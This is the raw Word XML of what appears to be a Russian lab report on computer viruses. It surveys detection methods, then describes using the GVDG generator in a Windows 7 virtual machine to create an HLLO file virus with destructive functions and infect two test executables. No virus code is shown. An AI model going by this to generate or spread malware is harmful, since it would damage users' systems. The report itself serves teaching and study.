    <w:p w14:paraId="15F47486" w14:textId="77777777" w:rsidR="00CC7237" w:rsidRDefault="00CC7237" w:rsidP="004E5FC2">
      <w:pPr>
        <w:ind w:left="23" w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6718367F" w14:textId="76DEDEC0" w:rsidR="00F31AD1" w:rsidRPr="00F31AD1" w:rsidRDefault="002C0D96" w:rsidP="004E5FC2">
      <w:pPr>
        <w:ind w:left="23" w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00F31AD1">
        <w:t>Генератор вирусов – программа, позволяющая задавать характеристики вирусов (например, тип, способ распространения, причиняемый вред) и получать на выходе код нового вируса</w:t>
      </w:r>
      <w:r w:rsidR="00F31AD1">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D4DC226" w14:textId="7015F1C8" w:rsidR="00F63A18" w:rsidRPr="00F63A18" w:rsidRDefault="00F63A18" w:rsidP="004E5FC2">
      <w:pPr>
        <w:ind w:left="23" w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00F63A18">
        <w:t>Известны следующие методы обнаружения вирусов:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F5A53AD" w14:textId="77777777" w:rsidR="00F63A18" w:rsidRPr="00F63A18" w:rsidRDefault="00F63A18" w:rsidP="004E5FC2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00F63A18">
        <w:t>обнаружение изменений;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3748E479" w14:textId="77777777" w:rsidR="00F63A18" w:rsidRPr="00F63A18" w:rsidRDefault="00F63A18" w:rsidP="004E5FC2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00F63A18">
        <w:t>эвристический анализ;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0271BA85" w14:textId="77777777" w:rsidR="00F63A18" w:rsidRPr="00F63A18" w:rsidRDefault="00F63A18" w:rsidP="004E5FC2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00F63A18">
        <w:t>использование резидентных сторожей;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="600D3B82" w14:textId="77777777" w:rsidR="00F63A18" w:rsidRPr="00F63A18" w:rsidRDefault="00F63A18" w:rsidP="004E5FC2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00F63A18">
        <w:t>вакцинирование программ;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76B0D719" w14:textId="77777777" w:rsidR="00F63A18" w:rsidRPr="00F63A18" w:rsidRDefault="00F63A18" w:rsidP="004E5FC2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00F63A18">
        <w:t>аппаратно-программная защита от вирусов.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E8A5F50" w14:textId="77777777" w:rsidR="00F63A18" w:rsidRPr="00F63A18" w:rsidRDefault="00F63A18" w:rsidP="004E5FC2">
      <w:pPr>
        <w:ind w:left="23" w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00F63A18">
        <w:t>Метод обнаружения изменений базируется на использовании программ-ревизоров. Эти программы определяют и запоминают характеристики всех областей на дисках, в которых обычно размещаются вирусы. При периодическом выполнении программ- ревизоров сравниваются хранящиеся характеристики и характеристики, получаемые при контроле областей дисков. По результатам ревизии программа выдает сведения о предположительном наличии вирусов.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6500CE37" w14:textId="0FACA6A4" w:rsidR="00F63A18" w:rsidRPr="00F63A18" w:rsidRDefault="00F63A18" w:rsidP="004E5FC2">
      <w:pPr>
        <w:ind w:left="23" w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00F63A18">
        <w:t>Обычно программы-ревизоры запоминают в специальных файлах образы главной загрузочной записи, загрузочных секторов логических дисков, характеристики всех контролируемых файлов, каталогов и номера дефектных кластеров. Могут контролироваться также объем установленной оперативной памяти, количество подключенных к компьютеру дисков и их параметры</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00F63A18">
        <w:t xml:space="preserve">Главным достоинством метода является возможность обнаружения вирусов всех типов, а также новых неизвестных вирусов. Совершенные программы-ревизоры </w:t>
      </w:r>
      <w:r w:rsidRPr="00F63A18">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">обнаруживают даже "стелс"-вирусы. Например, программа-ревизор </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F63A18">
        <w:t>Аdinf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F63A18">
        <w:t xml:space="preserve">, работает с диском непосредственно по секторам через </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F63A18">
        <w:t>Bios</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F63A18">
        <w:t>. Это не позволяет использовать "стелс"-вирусам возможность перехвата прерываний и "подставки" для контроля нужной вирусу области памяти.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F4CF10B" w14:textId="116E5F0D" w:rsidR="00F63A18" w:rsidRPr="00F63A18" w:rsidRDefault="00F63A18" w:rsidP="004E5FC2">
      <w:pPr>
        <w:ind w:left="23" w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00F63A18">
        <w:t>Эвристический анализ сравнительно недавно начал использоваться для обнаружения вирусов. Как и метод обнаружения изменений, данный метод позволяет определять неизвестные вирусы, но не требует предварительного сбора, обработки и хранения информации о файловой системе.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F63A18">
        <w:t xml:space="preserve">Сущность эвристического анализа заключается в проверке возможных сред обитания вирусов и выявление в них команд (групп команд) характерных для вирусов. Такими командами могут быть команды создания резидентных модулей в оперативной памяти, команды прямого обращения к дискам, минуя ОС. Эвристические анализаторы при обнаружении "подозрительных" команд в файлах или загрузочных секторах выдают сообщение о возможном заражении. После получения таких сообщений необходимо тщательно проверить предположительно зараженные файлы и загрузочные сектора всеми имеющимися антивирусными средствами. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E3DEF8" w14:textId="4826D670" w:rsidR="00F63A18" w:rsidRPr="00F63A18" w:rsidRDefault="00F63A18" w:rsidP="004E5FC2">
      <w:pPr>
        <w:ind w:left="23" w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00F63A18">
        <w:t>Метод использования резидентных сторожей основан на применении программ, которые постоянно находятся в ОП ЭВМ и отслеживают все действия остальных программ.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F63A18">
        <w:t>В случае выполнения какой-либо программой подозрительных действий (обращение для записи в загрузочные сектора, помещение в ОП резидентных модулей, попытки перехвата прерываний и т. п.) резидентный сторож выдает сообщение пользователю. Программа-сторож может загружать на выполнение другие антивирусные программы для проверки "подозрительных" программ, а также для контроля всех поступающих извне файлов (со сменных дисков, по сети).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24C23A4F" w14:textId="0C8B3593" w:rsidR="00F63A18" w:rsidRPr="00F63A18" w:rsidRDefault="00F63A18" w:rsidP="004E5FC2">
      <w:pPr>
        <w:ind w:left="23" w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00F63A18">
        <w:t xml:space="preserve">Под вакцинацией программ понимается создание специального модуля для контроля ее целостности. В качестве характеристики целостности файла обычно </w:t>
      </w:r>
      <w:r w:rsidRPr="00F63A18">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">используется контрольная сумма. </w:t>
      </w:r>
      <w:r w:rsidR="003365E7" w:rsidRPr="00F63A18">
        <w:t>При заражении вакцинированного файла</w:t>
      </w:r>
      <w:r w:rsidRPr="00F63A18">
        <w:t xml:space="preserve"> модуль контроля обнаруживает изменение контрольной суммы и сообщает об этом пользователю. Метод позволяет обнаруживать все вирусы, в том числе и незнакомые, за исключением "стеле"- вирусов.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A439D60" w14:textId="77777777" w:rsidR="00F63A18" w:rsidRPr="00F63A18" w:rsidRDefault="00F63A18" w:rsidP="004E5FC2">
      <w:pPr>
        <w:ind w:left="23" w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00F63A18">
        <w:t>Самым надежным методом защиты от вирусов является использование аппаратно-программных антивирусных средств. В настоящее время для защиты ПЭВМ используются специальные контроллеры и их программное обеспечение. Контроллер устанавливается в разъем расширения и имеет доступ к общей шине. Это позволяет ему контролировать все обращения к дисковой системе. В программном обеспечении контроллера запоминаются области на дисках, изменение которых в обычных режимах работы не допускается. Таким образом, можно установить защиту на изменение главной загрузочной записи, загрузочных секторов, файлов конфигурации, исполняемых файлов и др.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A40AD3C" w14:textId="57586818" w:rsidR="00A62E9E" w:rsidRDefault="00F63A18" w:rsidP="004E5FC2">
      <w:pPr>
        <w:ind w:left="23" w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00F63A18">
        <w:t>При выполнении запретных действий любой программой контроллер выдает соответствующее сообщение пользователю и блокирует работу ПЭВМ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="759E5741" w14:textId="1D11E298" w:rsidR="00036251" w:rsidRPr="00507CA0" w:rsidRDefault="00036251" w:rsidP="004E5FC2">
      <w:pPr>
        <w:ind w:left="23" w:right="4"/>
      </w:pPr>
      <w:r>
        <w:t>Созданные в ходе работы вирусы</w:t>
      </w:r>
      <w:r w:rsidR="00507CA0">
        <w:t xml:space="preserve"> изменяют значения реестра </w:t>
      </w:r>
      <w:r w:rsidR="00507CA0">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Windows</w:t>
      </w:r>
      <w:r w:rsidR="00507CA0" w:rsidRPr="00507CA0">
        <w:t>. Реестр Windows представляет собой структурированную базу данных, в которой хранятся параметры и информация, используемая операционной системой, драйверами, службами и программами.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA4737B" w14:textId="77777777" w:rsidR="00C93DCC" w:rsidRDefault="00C93DCC" w:rsidP="004E5FC2">
      <w:pPr>
        <w:suppressAutoHyphens/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EEF2781" w14:textId="77777777" w:rsidR="00C93DCC" w:rsidRPr="00C93DCC" w:rsidRDefault="00C93DCC" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Описание </w:t>
      </w:r>
      <w:r w:rsidR="005F5D88">
        <w:t>решения</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ACC4F1F" w14:textId="24178573" w:rsidR="00CB3392" w:rsidRPr="00CB3392" w:rsidRDefault="00CB3392" w:rsidP="004E5FC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Во избежание потери данных работа была выполнена на виртуальной машине на ОС </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Windows</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB3392">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> 7.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="711F6993" w14:textId="35674EF1" w:rsidR="001E64C6" w:rsidRDefault="001E64C6" w:rsidP="004E5FC2">
      <w:pPr>
        <w:suppressAutoHyphens/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E64C6">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">На локальном диске (С:) были созданы два каталога: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001E64C6">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>virus_test</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001E64C6">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001E64C6">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>virus_disk_test</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001E64C6">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>. Последн</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>ий</w:t>
      </w:r>
      <w:r w:rsidRPr="001E64C6">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> был смонтирован в корневой уровень файловой системы</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>X</w:t>
      </w:r>
      <w:r w:rsidRPr="001E64C6">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>:).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28459257" w14:textId="3A9D1C78" w:rsidR="00AA5403" w:rsidRDefault="00CB3392" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="aff0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="426" w:firstLine="425"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB3392">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>помощью</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB3392">
        <w:t xml:space="preserve"> генератор</w:t>
      </w:r>
      <w:r>
        <w:t>а</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB3392">
        <w:t xml:space="preserve"> вирусов GVDG</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>б</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB3392">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>ыл сгенерирован файловый вирус типа HLLO с несколькими разрушительными функциями</w:t>
      </w:r>
      <w:r w:rsidR="00AA5403">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>: з</w:t>
      </w:r>
      <w:r w:rsidR="00AA5403" w:rsidRPr="00AA5403">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>апретить модификацию меню пуск;</w:t>
      </w:r>
      <w:r w:rsidR="00AA5403">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> у</w:t>
      </w:r>
      <w:r w:rsidR="00AA5403" w:rsidRPr="00AA5403">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>станавливать случайное время;</w:t>
      </w:r>
      <w:r w:rsidR="00AA5403">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> н</w:t>
      </w:r>
      <w:r w:rsidR="00AA5403" w:rsidRPr="00AA5403">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>амусорить в текущем каталоге</w:t>
      </w:r>
      <w:r w:rsidR="00B6756A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="00B6756A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00B6756A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref100617712 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidR="00B6756A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00B6756A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00B6756A" w:rsidRPr="00AA5403">
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r w:rsidR="00B6756A" w:rsidRPr="00AA5403">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00B6756A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00B6756A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00AA5403" w:rsidRPr="00AA5403">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BBCDF2D" w14:textId="2C2C56EC" w:rsidR="00607841" w:rsidRDefault="003354F8" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="aff0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="426" w:firstLine="425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195A16BF" wp14:editId="5A6BCCD5">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>306070</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5068800" cy="3362400"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapTopAndBottom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8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5130F" w14:textId="798631AB" w:rsidR="00AA5403" w:rsidRDefault="00AA5403" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="aff0"/>
        <w:keepNext/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="426" w:firstLine="425"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CC72247" w14:textId="34895934" w:rsidR="00AA5403" w:rsidRPr="00F823F8" w:rsidRDefault="00AA5403" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1273"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_Ref100617712"/>
      <w:r w:rsidRPr="00AA5403"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1</w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
      <w:r w:rsidRPr="00AA5403">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:t>–</w:t>
      </w:r>
      <w:r w:rsidRPr="00AA5403">
        <w:t xml:space="preserve"> Интерфейс генератора </w:t>
      </w:r>
      <w:r w:rsidRPr="00AA5403">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>GVDG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="298D9639" w14:textId="77777777" w:rsidR="00607841" w:rsidRPr="00AA5403" w:rsidRDefault="00607841" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1273"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31A3CE52" w14:textId="5513C98E" w:rsidR="00CB3392" w:rsidRDefault="00CB3392" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="aff0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:firstLine="709"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB3392">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> Исходный код вируса на языке </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB3392">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Pascal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB3392">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> представлен </w:t>
      </w:r>
      <w:r w:rsidRPr="003365E7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>в Приложении 1</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB3392">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>. Блок-схема алгоритма работы вируса</w:t>
      </w:r>
      <w:r w:rsidR="003365E7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> представлена на </w:t>
      </w:r>
      <w:r w:rsidR="003365E7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="003365E7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref102682908 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidR="003365E7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="003365E7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="003365E7">
        <w:t xml:space="preserve">рисунке </w:t>
      </w:r>
      <w:r w:rsidR="003365E7">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r w:rsidR="003365E7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="003365E7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34037CCF" w14:textId="73283854" w:rsidR="00FF5DFA" w:rsidRDefault="00B6756A" w:rsidP="004E5FC2">
      <w:pPr>
        <w:ind w:firstLine="567"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B6756A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Для демонстрации заражения были выбра</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">ны два </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>exe</w:t>
      </w:r>
      <w:r w:rsidRPr="00B6756A"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color w:val="000000"/>
        </w:rPr>
        <w:t>файла</w:t>
      </w:r>
      <w:r w:rsidR="00FF5DFA">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="00FF5DFA">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00FF5DFA">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref100618290 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidR="00FF5DFA">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00FF5DFA">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00FF5DFA">
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r w:rsidR="00FF5DFA">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="00FF5DFA">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00FF5DFA"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</w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5310155C" w14:textId="77777777" w:rsidR="00607841" w:rsidRDefault="00607841" w:rsidP="004E5FC2">
      <w:pPr>
        <w:ind w:firstLine="567"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="625D0198" w14:textId="54C1D31A" w:rsidR="002E202B" w:rsidRDefault="002E202B" w:rsidP="004E5FC2">
      <w:pPr>
        <w:keepNext/>
        <w:ind w:firstLine="567"/>
      </w:pPr>
      <w:r w:rsidRPr="002E202B">
        <w:rPr>
          <w:rFonts w:eastAsia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7F66C6A" wp14:editId="2A38C6B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292000" cy="3639600"/>
            <wp:effectExtent l="0" t="0" r="4445" b="0"/>
            <wp:wrapTopAndBottom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DDABA" w14:textId="2B3BFAB0" w:rsidR="00FF5DFA" w:rsidRDefault="00FF5DFA" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1273"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Ref100618290"/>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:bookmarkStart w:id="2" w:name="_Ref102651730"/>
      <w:r w:rsidR="002E202B"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2</w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
      <w:bookmarkEnd w:id="2"/>
      <w:r w:rsidR="002E202B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EB2457">
